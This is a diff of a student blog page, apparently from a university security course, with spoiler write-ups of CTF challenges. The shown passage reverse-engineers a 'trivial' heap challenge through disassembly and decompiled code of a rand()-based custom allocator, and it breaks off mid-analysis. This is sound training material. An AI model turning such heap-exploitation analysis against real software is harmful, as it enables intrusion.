@@ -1,451 +1,171 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>plsdonthaq.me CTF Challenges - COMP6441 Musings</title>
-  <meta name="renderer" content="webkit" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>plsdonthaq.me CTF Challenges - COMP6441 Musings</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=z5206677><meta name=description content="WARNING: SPOILERS"><meta name=keywords content=Hugo,theme,even><meta name=generator content="Hugo 0.54.0 with even 4.0.0"><link rel=canonical href=../../post/plsdonthaq.me/><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../manifest.json><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><link href=../../dist/even.c2a46f00.min.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property=og:title content="plsdonthaq.me CTF Challenges"><meta property=og:description content="WARNING: SPOILERS"><meta property=og:type content=article><meta property=og:url content=/post/plsdonthaq.me/><meta property=article:published_time content=2019-07-25T13:34:08&#43;10:00><meta property=article:modified_time content=2019-07-25T13:34:08&#43;10:00><meta itemprop=name content="plsdonthaq.me CTF Challenges"><meta itemprop=description content="WARNING: SPOILERS"><meta itemprop=datePublished content=2019-07-25T13:34:08&#43;10:00><meta itemprop=dateModified content=2019-07-25T13:34:08&#43;10:00><meta itemprop=wordCount content=3194><meta itemprop=keywords content><meta name=twitter:card content=summary><meta name=twitter:title content="plsdonthaq.me CTF Challenges"><meta name=twitter:description content="WARNING: SPOILERS"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=../../ class=logo>COMP6441 Musings</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=../../><li class=mobile-menu-item>Home</li></a><a href=../../post/job-application><li class=mobile-menu-item>Job Application</li></a><a href=../../categories/><li class=mobile-menu-item>Categories</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=../../ class=logo>COMP6441 Musings</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=../../>Home</a></li><li class=menu-item><a class=menu-item-link href=../../post/job-application>Job Application</a></li><li class=menu-item><a class=menu-item-link href=../../categories/>Categories</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>plsdonthaq.me CTF Challenges</h1><div class=post-meta><span class=post-time>2019-07-25</span><div class=post-category><a href=../../categories/extended-security/>Extended Security</a>
+<a href=../../categories/musings/>Musings</a></div></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><a href=#category-hard>Category: Hard</a><ul><li><a href=#s-trivial-s><s>trivial</s></a></li></ul></li><li><a href=#category-web>Category: Web</a><ul><li><a href=#cookie>cookie</a></li><li><a href=#ezpz1-0>ezpz1.0</a></li></ul></li><li><a href=#category-binary>Category: Binary</a><ul><li><a href=#poodle>poodle</a></li><li><a href=#format0>format0</a></li><li><a href=#format2>format2</a></li><li><a href=#int1>int1</a></li></ul></li><li><a href=#category-crypto>Category: Crypto</a><ul><li><a href=#s-birthday-attack-s><s>birthday attack</s></a></li><li><a href=#diffie-1>diffie 1</a></li><li><a href=#diffie-2>diffie 2</a></li><li><a href=#s-mac-s><s>MAC</s></a></li><li><a href=#vinegar>vinegar</a></li><li><a href=#s-hash-length-magic-s><s>hash length magic</s></a></li></ul></li><li><a href=#category-misc>Category: Misc</a><ul><li><a href=#shuffle>shuffle</a></li><li><a href=#guess>guess</a></li></ul></li><li><a href=#just-give-me-the-answers>Just give me the answers</a></li></ul></nav></div></div><div class=post-content><p><strong><em>WARNING: SPOILERS</em></strong><br><strong><em>WARNING: SPOILERS</em></strong><br><strong><em>WARNING: SPOILERS</em></strong><br><strong><em>WARNING: SPOILERS</em></strong><br><strong><em>WARNING: SPOILERS</em></strong><br><strong><em>WARNING: SPOILERS</em></strong></p><hr><p>The tutors released some CTF questions at <a href=http://plsdonthaq.me>plsdonthaq.me</a>. Keen!</p><h1 id=category-hard>Category: Hard</h1><h2 id=s-trivial-s><s>trivial</s></h2><p><details></p><p><a href=trivial>[trivial]</a></p><p><strong>Analysis</strong><br>There&rsquo;s something <em>trivial</em> about this program&hellip;</p><p>Let&rsquo;s take a look at the dissasembly with <code>objdump -d trivial</code>, especially at <code>trivial_malloc</code> and <code>trivial_free</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-asm data-lang=asm><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-asm data-lang=asm><span class=err>000000000000178</span><span class=nf>d</span> <span class=err>&lt;</span><span class=no>trivial_malloc</span><span class=err>&gt;</span><span class=p>:</span>
+    <span class=err>178</span><span class=nl>d:</span>       <span class=err>55</span>                      <span class=nf>push</span>   <span class=nv>%rbp</span>
+    <span class=err>178</span><span class=nl>e:</span>       <span class=err>48</span> <span class=err>89</span> <span class=nf>e5</span>                <span class=no>mov</span>    <span class=nv>%rsp</span><span class=p>,</span><span class=nv>%rbp</span>
+    <span class=err>1791:</span>       <span class=err>48</span> <span class=err>83</span> <span class=nf>ec</span> <span class=mi>10</span>             <span class=no>sub</span>    <span class=no>$0x10</span><span class=p>,</span><span class=nv>%rsp</span>
+    <span class=err>1795:</span>       <span class=err>89</span> <span class=err>7</span><span class=nf>d</span> <span class=no>fc</span>                <span class=no>mov</span>    <span class=nv>%edi</span><span class=p>,-</span><span class=mi>0x4</span><span class=p>(</span><span class=nv>%rbp</span><span class=p>)</span>
+    <span class=err>1798:</span>       <span class=nf>b8</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span> <span class=mi>00</span>          <span class=no>mov</span>    <span class=no>$0x0</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>179</span><span class=nl>d:</span>       <span class=nf>e8</span> <span class=mi>7</span><span class=no>e</span> <span class=no>f9</span> <span class=no>ff</span> <span class=no>ff</span>          <span class=no>callq</span>  <span class=mh>1120</span> <span class=p>&lt;</span><span class=no>rand@plt</span><span class=p>&gt;</span>
+    <span class=err>17</span><span class=nl>a2:</span>       <span class=err>99</span>                      <span class=nf>cltd</span>   
+    <span class=mi>17</span><span class=no>a3</span><span class=p>:</span>       <span class=no>c1</span> <span class=no>ea</span> <span class=mi>0</span><span class=no>f</span>                <span class=no>shr</span>    <span class=no>$0xf</span><span class=p>,</span><span class=nv>%edx</span>
+    <span class=err>17</span><span class=nl>a6:</span>       <span class=err>01</span> <span class=nf>d0</span>                   <span class=no>add</span>    <span class=nv>%edx</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>17</span><span class=nl>a8:</span>       <span class=err>25</span> <span class=nf>ff</span> <span class=no>ff</span> <span class=mi>01</span> <span class=mi>00</span>          <span class=no>and</span>    <span class=no>$0x1ffff</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>17</span><span class=nl>ad:</span>       <span class=err>29</span> <span class=nf>d0</span>                   <span class=no>sub</span>    <span class=nv>%edx</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>17</span><span class=nl>af:</span>       <span class=err>05</span> <span class=err>00</span> <span class=err>00</span> <span class=err>40</span> <span class=err>00</span>          <span class=nf>add</span>    <span class=no>$0x400000</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>17</span><span class=nl>b4:</span>       <span class=err>83</span> <span class=nf>e0</span> <span class=no>f8</span>                <span class=no>and</span>    <span class=no>$0xfffffff8</span><span class=p>,</span><span class=nv>%eax</span>
+    <span class=err>17</span><span class=nl>b7:</span>       <span class=err>48</span> <span class=err>98</span>                   <span class=nf>cltq</span>   
+    <span class=mi>17</span><span class=no>b9</span><span class=p>:</span>       <span class=no>c9</span>                      <span class=no>leaveq</span> 
+    <span class=mi>17</span><span class=no>ba</span><span class=p>:</span>       <span class=no>c3</span>                      <span class=no>retq</span>   
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<span class=mh>00000000000017bb</span> <span class=p>&lt;</span><span class=no>trivial_free</span><span class=p>&gt;:</span>
+    <span class=err>17</span><span class=nl>bb:</span>       <span class=err>55</span>                      <span class=nf>push</span>   <span class=nv>%rbp</span>
+    <span class=err>17</span><span class=nl>bc:</span>       <span class=err>48</span> <span class=err>89</span> <span class=nf>e5</span>                <span class=no>mov</span>    <span class=nv>%rsp</span><span class=p>,</span><span class=nv>%rbp</span>
+    <span class=err>17</span><span class=nl>bf:</span>       <span class=err>48</span> <span class=err>89</span> <span class=err>7</span><span class=nf>d</span> <span class=no>f8</span>             <span class=no>mov</span>    <span class=nv>%rdi</span><span class=p>,-</span><span class=mi>0x8</span><span class=p>(</span><span class=nv>%rbp</span><span class=p>)</span>
+    <span class=err>17</span><span class=nl>c3:</span>       <span class=err>90</span>                      <span class=nf>nop</span>
+    <span class=err>17</span><span class=nl>c4:</span>       <span class=err>5</span><span class=nf>d</span>                      <span class=no>pop</span>    <span class=nv>%rbp</span>
+    <span class=err>17</span><span class=nl>c5:</span>       <span class=nf>c3</span>                      <span class=no>retq</span>   
+    <span class=mi>17</span><span class=no>c6</span><span class=p>:</span>       <span class=mi>66</span> <span class=mi>2</span><span class=no>e</span> <span class=mi>0</span><span class=no>f</span> <span class=mi>1</span><span class=no>f</span> <span class=mi>84</span> <span class=mi>00</span> <span class=mi>00</span>    <span class=no>nopw</span>   <span class=nv>%cs</span><span class=p>:</span><span class=mi>0x0</span><span class=p>(</span><span class=nv>%rax</span><span class=p>,</span><span class=nv>%rax</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
+    <span class=err>17</span><span class=nl>cd:</span>       <span class=err>00</span> <span class=err>00</span> <span class=err>00</span> </code></pre></td></tr></table></div></div><p>Hm&hellip;</p><p>Let&rsquo;s use a decompiler for an easier understanding of these two functions.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-c data-lang=c><span class=c1>// 0x000000000000178D
+</span><span class=c1></span><span class=n>int64</span> <span class=nf>trivial_malloc</span><span class=p>()</span> <span class=p>{</span>
+  <span class=k>return</span> <span class=p>(</span><span class=kt>signed</span> <span class=kt>int</span><span class=p>)((</span><span class=n>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0x20000</span> <span class=o>+</span> <span class=mh>0x400000</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFF8</span><span class=p>);</span>
+<span class=p>}</span>
 
-<meta name="theme-color" content="#f8f5ec" />
-<meta name="msapplication-navbutton-color" content="#f8f5ec">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+<span class=c1>// 0x00000000000017BB
+</span><span class=c1></span><span class=kt>void</span> <span class=nf>trivial_free</span><span class=p>()</span> <span class=p>{</span>
 
-
-<meta name="author" content="z5206677" /><meta name="description" content="WARNING: SPOILERS" /><meta name="keywords" content="Hugo, theme, even" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.54.0 with even 4.0.0" />
-
-
-<link rel="canonical" href="../../post/plsdonthaq.me/" />
-<link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png">
-<link rel="manifest" href="../../manifest.json">
-<link rel="mask-icon" href="../../safari-pinned-tab.svg" color="#5bbad5">
-
-
-<link href="../../dist/even.c2a46f00.min.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
-
-
-<meta property="og:title" content="plsdonthaq.me CTF Challenges" />
-<meta property="og:description" content="WARNING: SPOILERS" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/post/plsdonthaq.me/" />
-<meta property="article:published_time" content="2019-07-25T13:34:08&#43;10:00"/>
-<meta property="article:modified_time" content="2019-07-25T13:34:08&#43;10:00"/>
-
-<meta itemprop="name" content="plsdonthaq.me CTF Challenges">
-<meta itemprop="description" content="WARNING: SPOILERS">
-
-
-<meta itemprop="datePublished" content="2019-07-25T13:34:08&#43;10:00" />
-<meta itemprop="dateModified" content="2019-07-25T13:34:08&#43;10:00" />
-<meta itemprop="wordCount" content="3194">
-
-
-
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="plsdonthaq.me CTF Challenges"/>
-<meta name="twitter:description" content="WARNING: SPOILERS"/>
-
-<!--[if lte IE 9]>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
-<![endif]-->
-
-<!--[if lt IE 9]>
-  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
-<![endif]-->
-
-</head>
-<body>
-  <div id="mobile-navbar" class="mobile-navbar">
-  <div class="mobile-header-logo">
-    <a href="../../" class="logo">COMP6441 Musings</a>
-  </div>
-  <div class="mobile-navbar-icon">
-    <span></span>
-    <span></span>
-    <span></span>
-  </div>
-</div>
-<nav id="mobile-menu" class="mobile-menu slideout-menu">
-  <ul class="mobile-menu-list">
-    <a href="../../">
-        <li class="mobile-menu-item">Home</li>
-      </a><a href="../../post/job-application">
-        <li class="mobile-menu-item">Job Application</li>
-      </a><a href="../../categories/">
-        <li class="mobile-menu-item">Categories</li>
-      </a>
-  </ul>
-</nav>
-  <div class="container" id="mobile-panel">
-    <header id="header" class="header">
-        <div class="logo-wrapper">
-  <a href="../../" class="logo">COMP6441 Musings</a>
-</div>
-
-<nav class="site-navbar">
-  <ul id="menu" class="menu">
-    <li class="menu-item">
-        <a class="menu-item-link" href="../../">Home</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="../../post/job-application">Job Application</a>
-      </li><li class="menu-item">
-        <a class="menu-item-link" href="../../categories/">Categories</a>
-      </li>
-  </ul>
-</nav>
-    </header>
-
-    <main id="main" class="main">
-      <div class="content-wrapper">
-        <div id="content" class="content">
-          <article class="post">
-    
-    <header class="post-header">
-      <h1 class="post-title">plsdonthaq.me CTF Challenges</h1>
-
-      <div class="post-meta">
-        <span class="post-time"> 2019-07-25 </span>
-        <div class="post-category">
-            <a href="../../categories/extended-security/"> Extended Security </a>
-            <a href="../../categories/musings/"> Musings </a>
-            </div>
-        
-      </div>
-    </header>
-
-    <div class="post-toc" id="post-toc">
-  <h2 class="post-toc-title">Contents</h2>
-  <div class="post-toc-content always-active">
-    <nav id="TableOfContents">
-<ul>
-<li><a href="#category-hard">Category: Hard</a>
-<ul>
-<li><a href="#s-trivial-s"><s>trivial</s></a></li>
-</ul></li>
-<li><a href="#category-web">Category: Web</a>
-<ul>
-<li><a href="#cookie">cookie</a></li>
-<li><a href="#ezpz1-0">ezpz1.0</a></li>
-</ul></li>
-<li><a href="#category-binary">Category: Binary</a>
-<ul>
-<li><a href="#poodle">poodle</a></li>
-<li><a href="#format0">format0</a></li>
-<li><a href="#format2">format2</a></li>
-<li><a href="#int1">int1</a></li>
-</ul></li>
-<li><a href="#category-crypto">Category: Crypto</a>
-<ul>
-<li><a href="#s-birthday-attack-s"><s>birthday attack</s></a></li>
-<li><a href="#diffie-1">diffie 1</a></li>
-<li><a href="#diffie-2">diffie 2</a></li>
-<li><a href="#s-mac-s"><s>MAC</s></a></li>
-<li><a href="#vinegar">vinegar</a></li>
-<li><a href="#s-hash-length-magic-s"><s>hash length magic</s></a></li>
-</ul></li>
-<li><a href="#category-misc">Category: Misc</a>
-<ul>
-<li><a href="#shuffle">shuffle</a></li>
-<li><a href="#guess">guess</a></li>
-</ul></li>
-<li><a href="#just-give-me-the-answers">Just give me the answers</a></li>
-</ul>
-</nav>
-  </div>
-</div>
-    <div class="post-content">
-      
-
-<p><strong><em>WARNING: SPOILERS</em></strong><br />
-<strong><em>WARNING: SPOILERS</em></strong><br />
-<strong><em>WARNING: SPOILERS</em></strong><br />
-<strong><em>WARNING: SPOILERS</em></strong><br />
-<strong><em>WARNING: SPOILERS</em></strong><br />
-<strong><em>WARNING: SPOILERS</em></strong></p>
-
-<hr />
-
-<p>The tutors released some CTF questions at <a href="http://plsdonthaq.me">plsdonthaq.me</a>. Keen!</p>
-
-<h1 id="category-hard">Category: Hard</h1>
-
-<h2 id="s-trivial-s"><s>trivial</s></h2>
-
-<p><details></p>
-
-<p><a href="trivial">[trivial]</a></p>
-
-<p><strong>Analysis</strong><br />
-There&rsquo;s something <em>trivial</em> about this program&hellip;</p>
-
-<p>Let&rsquo;s take a look at the dissasembly with <code>objdump -d trivial</code>, especially at <code>trivial_malloc</code> and <code>trivial_free</code>.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">000000000000178</span><span class="nf">d</span> <span class="err">&lt;</span><span class="no">trivial_malloc</span><span class="err">&gt;</span><span class="p">:</span>
-    <span class="err">178</span><span class="nl">d:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="nv">%rbp</span>
-    <span class="err">178</span><span class="nl">e:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="nv">%rsp</span><span class="p">,</span><span class="nv">%rbp</span>
-    <span class="err">1791:</span>       <span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">10</span>             <span class="no">sub</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%rsp</span>
-    <span class="err">1795:</span>       <span class="err">89</span> <span class="err">7</span><span class="nf">d</span> <span class="no">fc</span>                <span class="no">mov</span>    <span class="nv">%edi</span><span class="p">,-</span><span class="mi">0x4</span><span class="p">(</span><span class="nv">%rbp</span><span class="p">)</span>
-    <span class="err">1798:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">179</span><span class="nl">d:</span>       <span class="nf">e8</span> <span class="mi">7</span><span class="no">e</span> <span class="no">f9</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">callq</span>  <span class="mh">1120</span> <span class="p">&lt;</span><span class="no">rand@plt</span><span class="p">&gt;</span>
-    <span class="err">17</span><span class="nl">a2:</span>       <span class="err">99</span>                      <span class="nf">cltd</span>   
-    <span class="mi">17</span><span class="no">a3</span><span class="p">:</span>       <span class="no">c1</span> <span class="no">ea</span> <span class="mi">0</span><span class="no">f</span>                <span class="no">shr</span>    <span class="no">$0xf</span><span class="p">,</span><span class="nv">%edx</span>
-    <span class="err">17</span><span class="nl">a6:</span>       <span class="err">01</span> <span class="nf">d0</span>                   <span class="no">add</span>    <span class="nv">%edx</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">17</span><span class="nl">a8:</span>       <span class="err">25</span> <span class="nf">ff</span> <span class="no">ff</span> <span class="mi">01</span> <span class="mi">00</span>          <span class="no">and</span>    <span class="no">$0x1ffff</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">17</span><span class="nl">ad:</span>       <span class="err">29</span> <span class="nf">d0</span>                   <span class="no">sub</span>    <span class="nv">%edx</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">17</span><span class="nl">af:</span>       <span class="err">05</span> <span class="err">00</span> <span class="err">00</span> <span class="err">40</span> <span class="err">00</span>          <span class="nf">add</span>    <span class="no">$0x400000</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">17</span><span class="nl">b4:</span>       <span class="err">83</span> <span class="nf">e0</span> <span class="no">f8</span>                <span class="no">and</span>    <span class="no">$0xfffffff8</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">17</span><span class="nl">b7:</span>       <span class="err">48</span> <span class="err">98</span>                   <span class="nf">cltq</span>   
-    <span class="mi">17</span><span class="no">b9</span><span class="p">:</span>       <span class="no">c9</span>                      <span class="no">leaveq</span> 
-    <span class="mi">17</span><span class="no">ba</span><span class="p">:</span>       <span class="no">c3</span>                      <span class="no">retq</span>   
-
-<span class="mh">00000000000017bb</span> <span class="p">&lt;</span><span class="no">trivial_free</span><span class="p">&gt;:</span>
-    <span class="err">17</span><span class="nl">bb:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="nv">%rbp</span>
-    <span class="err">17</span><span class="nl">bc:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="nv">%rsp</span><span class="p">,</span><span class="nv">%rbp</span>
-    <span class="err">17</span><span class="nl">bf:</span>       <span class="err">48</span> <span class="err">89</span> <span class="err">7</span><span class="nf">d</span> <span class="no">f8</span>             <span class="no">mov</span>    <span class="nv">%rdi</span><span class="p">,-</span><span class="mi">0x8</span><span class="p">(</span><span class="nv">%rbp</span><span class="p">)</span>
-    <span class="err">17</span><span class="nl">c3:</span>       <span class="err">90</span>                      <span class="nf">nop</span>
-    <span class="err">17</span><span class="nl">c4:</span>       <span class="err">5</span><span class="nf">d</span>                      <span class="no">pop</span>    <span class="nv">%rbp</span>
-    <span class="err">17</span><span class="nl">c5:</span>       <span class="nf">c3</span>                      <span class="no">retq</span>   
-    <span class="mi">17</span><span class="no">c6</span><span class="p">:</span>       <span class="mi">66</span> <span class="mi">2</span><span class="no">e</span> <span class="mi">0</span><span class="no">f</span> <span class="mi">1</span><span class="no">f</span> <span class="mi">84</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">nopw</span>   <span class="nv">%cs</span><span class="p">:</span><span class="mi">0x0</span><span class="p">(</span><span class="nv">%rax</span><span class="p">,</span><span class="nv">%rax</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
-    <span class="err">17</span><span class="nl">cd:</span>       <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> </code></pre></td></tr></table>
-</div>
-</div>
-<p>Hm&hellip;</p>
-
-<p>Let&rsquo;s use a decompiler for an easier understanding of these two functions.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// 0x000000000000178D
-</span><span class="c1"></span><span class="n">int64</span> <span class="nf">trivial_malloc</span><span class="p">()</span> <span class="p">{</span>
-  <span class="k">return</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)((</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0x20000</span> <span class="o">+</span> <span class="mh">0x400000</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF8</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="c1">// 0x00000000000017BB
-</span><span class="c1"></span><span class="kt">void</span> <span class="nf">trivial_free</span><span class="p">()</span> <span class="p">{</span>
-
-<span class="p">}</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>There&rsquo;s &hellip; no <code>malloc</code>? Nor is there a <code>calloc</code> anywhere?<br />
-And you can definitely see that if you search the dissasembly <code>objdump -d trivial | grep malloc</code>.</p>
-
-<p>So, the assignment of our items into the heap is being controlled <strong>manually</strong>!</p>
-
-<p>There&rsquo;s also this function called <code>con</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0000000000001716</span> <span class="err">&lt;</span><span class="nf">con</span><span class="err">&gt;</span><span class="p">:</span>
-    <span class="err">1716:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="nv">%rbp</span>
-    <span class="err">1717:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="nv">%rsp</span><span class="p">,</span><span class="nv">%rbp</span>
-    <span class="err">171</span><span class="nl">a:</span>       <span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">10</span>             <span class="no">sub</span>    <span class="no">$0x10</span><span class="p">,</span><span class="nv">%rsp</span>
-    <span class="err">171</span><span class="nl">e:</span>       <span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%edi</span>
-    <span class="err">1723:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
-    <span class="err">1728:</span>       <span class="nf">e8</span> <span class="no">b3</span> <span class="no">f9</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">callq</span>  <span class="mh">10e0</span> <span class="p">&lt;</span><span class="no">time@plt</span><span class="p">&gt;</span>
-    <span class="err">172</span><span class="nl">d:</span>       <span class="err">89</span> <span class="nf">c7</span>                   <span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%edi</span>
